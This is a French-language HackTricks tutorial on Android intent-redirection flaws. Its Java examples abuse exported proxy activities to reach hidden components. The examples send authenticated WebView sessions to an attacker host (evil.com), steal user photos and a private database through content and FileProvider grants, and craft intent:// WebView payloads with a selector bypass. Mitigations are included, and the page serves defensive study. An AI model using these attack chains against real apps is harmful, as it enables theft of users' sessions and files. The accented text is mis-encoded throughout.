```markdown
<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Recherche tir√©e de** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# Introduction

Cette vuln√©rabilit√© ressemble √† **Open Redirect dans la s√©curit√© web**. Puisque la classe `Intent` est `Parcelable`, **les objets appartenant √† cette classe** peuvent √™tre **transmis** comme **donn√©es suppl√©mentaires** dans un autre objet `Intent`. \
De nombreux d√©veloppeurs utilisent cette **fonctionnalit√©** et cr√©ent des **composants proxy** (activit√©s, r√©cepteurs de diffusion et services) qui **prennent un Intent int√©gr√© et le transmettent √† des m√©thodes dangereuses** comme `startActivity(...)`, `sendBroadcast(...)`, etc. \
C'est dangereux car **un attaquant peut forcer l'application √† lancer un composant non export√© qui ne peut pas √™tre lanc√© directement depuis une autre application**, ou pour accorder √† l'attaquant l'acc√®s √† ses fournisseurs de contenu. **`WebView`** change parfois aussi une **URL d'une cha√Æne en un objet `Intent`**, en utilisant la m√©thode `Intent.parseUri(...)`, et le transmet √† `startActivity(...)`.

{% hint style="info" %}
En r√©sum√© : Si un attaquant peut envoyer un Intent qui est ex√©cut√© de mani√®re non s√©curis√©e, il peut potentiellement acc√©der √† des composants non export√©s et en abuser.
{% endhint %}

# Un cas typique

Examinons un exemple. Fragment du fichier `AndroidManifest.xml`
```
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Activit√© `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Activit√© `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity` est un exemple de **fonctionnalit√© d'application cach√©e qui effectue certaines actions non s√©curis√©es**, dans ce cas, transmettant la session d'authentification de l'utilisateur √† une URL obtenue √† partir du param√®tre `url`.

Les restrictions √† l'exportation signifient que **l'attaquant ne peut pas acc√©der directement √† `AuthWebViewActivity`**. Un appel direct
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
```markdown
lance une `java.lang.SecurityException`, en raison d'un `Permission Denial` : `AuthWebViewActivity non export√© depuis l'uid 1337`.

Mais l'attaquant peut **forcer la victime √† lancer `AuthWebViewActivity` elle-m√™me** :
```
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
# Escalation de l'impact

Pour augmenter l'impact de cette vuln√©rabilit√©, vous devez **trouver d'autres vuln√©rabilit√©s/configurations incorrectes qui pourraient permettre d'augmenter l'impact de la vuln√©rabilit√©** (car la vuln√©rabilit√© en elle-m√™me ne cr√©e pas de risques).

## Escalation des attaques via les Content Providers

En plus de l'acc√®s aux composants arbitraires de l'application originale, **l'attaquant peut tenter d'acc√©der √† ceux des Content Providers de l'application vuln√©rable** qui satisfont aux conditions suivantes :

* il doit √™tre **non-export√©** (sinon il **pourrait √™tre attaqu√© directement**, sans utiliser la vuln√©rabilit√© dont nous discutons dans cet article)
* il doit avoir le flag **`android:grantUriPermissions`** d√©fini sur **`true`**.
* `android:grantUriPermissions="true"` indique que votre code Java peut utiliser `FLAG_GRANT_READ_URI_PERMISSION` et `FLAG_GRANT_WRITE_URI_PERMISSION` pour **n'importe quel `Uri` servi par ce `ContentProvider`**.
* `android:grantUriPermissions="false"` indique que **seules les valeurs `Uri` sp√©cifi√©es par les √©l√©ments enfants `<grant-uri-permission>`** peuvent √™tre utilis√©es avec `FLAG_GRANT_READ_URI_PERMISSION` et `FLAG_GRANT_WRITE_URI_PERMISSION`.

L'attaquant doit se d√©finir comme le destinataire d'une intention int√©gr√©e et d√©finir les flags suivants

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` permet un acc√®s persistant au fournisseur (sans ce flag, l'acc√®s est unique)
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` permet l'acc√®s √† l'URI par pr√©fixe ‚Äì par exemple, au lieu d'obtenir s√©par√©ment un acc√®s r√©p√©t√© en utilisant un chemin complet tel que `content://com.victim.provider/image/1`, l'attaquant peut accorder l'acc√®s √† tout le contenu du fournisseur en utilisant l'URI `content://com.victim.provider/` et ensuite utiliser `ContentResolver` pour adresser `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2`, etc.
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` permet les op√©rations de lecture sur le fournisseur (telles que `query`, `openFile`, `openAssetFile`)
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` permet les op√©rations d'√©criture

Un exemple typique de fournisseur o√π un attaquant peut acc√©der et effectuer des op√©rations r√©guli√®res comme `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile`
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
Exemple de vol de photos d'utilisateur dans le fichier `AndroidManifest.xml`
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
Fichier `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Attaques sur le fournisseur de fichiers Android

Cette vuln√©rabilit√© permet √©galement √† l'attaquant de **voler des fichiers d'application** situ√©s dans des r√©pertoires que le d√©veloppeur a pr√©d√©termin√©s. Pour une attaque r√©ussie, l'application malveillante doit **obtenir des droits d'acc√®s au fournisseur de fichiers Android puis lire le contenu du fournisseur de fichiers √† l'aide du ContentResolver Android**.

Exemple de fournisseur de fichiers (pour plus de d√©tails, voir [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider))
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
Il fournit un acc√®s en lecture/√©criture aux fichiers sur une liste sp√©ciale qui peut √™tre trouv√©e dans les ressources de l'application, dans ce cas √† `res/xml/provider_paths.xml`

Cela peut ressembler √† quelque chose comme
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
Chaque balise sp√©cifie un r√©pertoire racine avec une valeur `path` relative √† la racine. Par exemple, la valeur `external_files` correspondra √† `new File(Environment.getExternalStorageDirectory(), "images")`

La valeur `root-path` correspond √† `/`, c'est-√†-dire qu'elle donne acc√®s √† des fichiers arbitraires.

Disons que nous avons des donn√©es secr√®tes stock√©es dans le fichier `/data/data/com.victim/databases/secret.db` : le vol de ce fichier peut ressembler √† quelque chose comme ceci `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## Acc√®s √† des composants arbitraires via WebView

Un objet Intent peut √™tre converti en cha√Æne de caract√®res avec un appel √† `Intent.toUri(flags)` et inversement, d'une cha√Æne de caract√®res en Intent en utilisant `Intent.parseUri(stringUri, flags)`. Cette fonctionnalit√© est souvent utilis√©e dans WebView (le navigateur int√©gr√© de l'application) : **l'application peut v√©rifier un sch√©ma `intent://`, analyser l'URL en un Intent et lancer l'activit√©**.

**Cette vuln√©rabilit√© peut √™tre exploit√©e √† la fois via d'autres vuln√©rabilit√©s** (par exemple, la capacit√© d'ouvrir des liens arbitraires dans l'application dans WebView directement via des activit√©s export√©es ou par le biais du m√©canisme de deeplink) dans l'application cliente et √©galement √† distance, y compris le cross-site scripting c√¥t√© serveur ou MitM c√¥t√© client.

Exemple de code vuln√©rable
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
```markdown
L'objectif ici est que la m√©thode `shouldOverrideUrlLoading(...)` de la classe `WebViewClient` est appel√©e √† chaque fois que WebView tente de charger un nouveau lien, mais donne √† l'application la possibilit√© d'ajouter un gestionnaire personnalis√©.

Pour exploiter cette vuln√©rabilit√©, l'attaquant doit cr√©er une redirection WebView vers une URL de sch√©ma d'intent sp√©cialement pr√©par√©e. Exemple de cr√©ation d'URL
```
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
Exemple d'attaque
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
Cette version contient **plusieurs restrictions par rapport √† la version classique** de la vuln√©rabilit√© :

* Les objets `Parcelable` et `Serializable` int√©gr√©s ne peuvent pas √™tre convertis en cha√Æne de caract√®res (ils seront ignor√©s)
* Les drapeaux non s√©curis√©s `Intent.FLAG_GRANT_READ_URI_PERMISSION` et `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` sont **ignor√©s** lorsque `Intent.parseUri(...)` est appel√©. Le parseur les conservera uniquement si le drapeau `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))`) est d√©fini, ce qui est tr√®s rare

De nombreux d√©veloppeurs oublient encore d'effectuer un filtrage complet des intents re√ßus via WebView
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
L'attaquant peut sp√©cifier un composant non export√© via un s√©lecteur
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
Et contourner la protection de l'application contre les intents explicites. Nous recommandons donc √©galement de filtrer le s√©lecteur.
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
Mais m√™me un filtrage complet ne garantit pas une protection totale, car un attaquant peut cr√©er une intention implicite correspondant au `intent-filter` d'une activit√© non export√©e. Exemple de d√©claration d'activit√© :
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
Nous recommandons donc de v√©rifier qu'une activit√© est export√©e avant de la lancer.

## Autres m√©thodes de cr√©ation d'intents non s√©curis√©s

Certains d√©veloppeurs d'applications mettent en ≈ìuvre **leurs propres analyseurs d'intents** (souvent pour g√©rer des **deeplinks** ou des messages push), en utilisant par exemple des objets **JSON**, des cha√Ænes de caract√®res ou des tableaux d'octets, qui ne diff√®rent pas du comportement par d√©faut ou pr√©sentent un grand danger, car ils peuvent √©tendre les objets **`Serializable`** et `Parcelable` et ils permettent √©galement de d√©finir des drapeaux non s√©curis√©s. Le chercheur en s√©curit√© peut √©galement rencontrer des versions plus exotiques de cr√©ation d'intent, telles que la conversion d'un tableau d'octets en `Parcel` puis la lecture d'un intent √† partir de celui-ci.
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# Application vuln√©rable

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
